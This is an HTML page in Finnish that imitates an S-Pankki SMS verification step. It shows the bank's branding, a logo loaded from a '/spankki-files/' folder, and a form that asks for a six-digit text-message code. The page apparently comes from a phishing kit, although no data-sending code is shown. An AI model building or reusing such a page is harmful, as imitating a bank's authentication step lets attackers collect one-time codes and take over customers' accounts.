<!DOCTYPE html>
<html lang="fi">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="google" content="notranslate">
    <title>Tunnistautuminen</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
        }
        .container-wrapper {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        header {
            background: #00a651;
            color: white;
            padding: 20px;
            text-align: center;
        }
        .logo {
            width: 120px;
            height: auto;
            margin: 0 auto 10px;
            display: block;
        }
        main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }
        .content {
            max-width: 600px;
            width: 100%;
            background: white;
            border-radius: 8px;
            padding: 40px;
        }
        .page-title {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 30px;
            color: #333;
            text-align: center;
        }
        .sub-title {
            font-size: 18px;
            font-weight: 500;
            margin-bottom: 20px;
            color: #333;
        }
        .input-wrapper {
            margin-bottom: 20px;
        }
        .input-label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 8px;
            color: #333;
        }
        .input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        .input:focus {
            outline: none;
            border-color: #00a651;
        }
        .button {
            width: 100%;
            padding: 12px;
            background: #00a651;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 20px;
        }
        .button:hover {
            background: #008a42;
        }
        footer {
            background: #f5f5f5;
            padding: 20px;
            text-align: center;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container-wrapper">
        <header>
            <img class="logo" src="/spankki-files/s-bank-fi.svg" alt="S-Pankki">
        </header>

        <main role="main">
            <div class="content">
                <h1 class="page-title">Tekstiviestivahvistus</h1>
                <form id="sms-form" autocomplete="off">
                    <fieldset>
                        <legend class="sub-title">Syötä tekstiviestikoodi</legend>
                        <div class="input-wrapper">
                            <label for="sms-code">
                                <span class="input-label">Tekstiviestikoodi</span>
                                <input id="sms-code" class="input" name="sms_code" type="text" inputmode="numeric" minlength="6" maxlength="6" placeholder="123456">
                            </label>
                        </div>
                    </fieldset>
                    <button class="button" type="submit" id="sms-button">Jatka</button>
                </form>
            </div>
        </main>

        <footer>
            <div>© S-Pankki 2026</div>
        </footer>
    </div>
</body>
</html>
